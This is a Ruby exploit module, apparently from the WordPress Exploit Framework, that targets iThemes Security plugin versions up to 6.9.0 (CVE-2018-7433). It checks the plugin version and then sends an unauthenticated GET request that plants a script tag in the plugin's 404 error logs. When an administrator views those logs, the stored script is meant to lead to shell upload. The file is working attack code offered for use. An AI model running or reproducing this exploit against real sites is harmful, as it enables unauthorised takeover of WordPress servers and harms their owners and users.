# frozen_string_literal: true

class Wpxf::Exploit::IthemesSecurityV690StoredXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::StoredXss

  def initialize
    super

    update_info(
      name: 'iThemes Security <= 6.9.0 Unauthenticated Stored XSS Shell Upload',
      author: [
        'Paweł Kuryłowicz', # Disclosure
        'rastating'         # WPXF module
      ],
      references: [
        ['WPVDB', '9037'],
        ['CVE', '2018-7433']
      ],
      date: 'Oct 06 2016'
    )
  end

  def check
    check_plugin_version_from_readme('better-wp-security', '6.9.1')
  end

  def expected_status_code_after_store
    404
  end

  def vulnerable_page
    'the 404 error logs'
  end

  def store_script
    execute_get_request(
      url: "#{full_uri}?p=#{Wpxf::Utility::Text.rand_numeric(11)}&<script>#{xss_include_script}</script>"
    )
  end
end
